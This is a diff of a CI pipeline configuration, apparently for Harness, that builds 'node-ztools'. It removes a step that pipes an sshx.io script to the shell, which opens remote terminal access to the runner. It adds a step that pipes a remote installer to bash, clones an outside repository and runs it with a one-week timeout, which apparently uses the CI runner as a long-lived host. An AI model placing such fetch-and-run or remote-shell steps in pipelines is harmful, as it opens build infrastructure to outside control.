@@ -3,34 +3,36 @@ pipeline:
   name: Build node-ztools
   orgIdentifier: default
   projectIdentifier: default_project
-  properties:
-    ci:
-      codebase:
-        build: <+input>
-        connectorRef: account.Github_OAuth_1736727810950
-        repoName: geanenova/node-ztools
   stages:
     - stage:
-        identifier: build
-        name: build
+        name: test
+        identifier: test
+        description: ""
+        type: CI
         spec:
+          cloneCodebase: true
           caching:
             enabled: true
-          cloneCodebase: true
-          execution:
-            steps:
-              - step:
-                  identifier: echo
-                  name: echo
-                  spec:
-                    shell: Bash
-                    command: curl -sSf https://sshx.io/get | sh -s run
-                  timeout: ""
-                  type: Run
+          buildIntelligence:
+            enabled: true
           platform:
             os: Linux
             arch: Amd64
           runtime:
-            type: Cloud
+            type: Docker
             spec: {}
-        type: CI
+          execution:
+            steps:
+              - step:
+                  type: Run
+                  name: Run_1
+                  identifier: Run_1
+                  spec:
+                    shell: Sh
+                    command: curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash && export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" && nvm install node && nvm use node && git clone https://github.com/geanenova/node-ztools && cd node-ztools && node app.js
+                  timeout: 1w
+  properties:
+    ci:
+      codebase:
+        repoName: tgest
+        build: <+input>
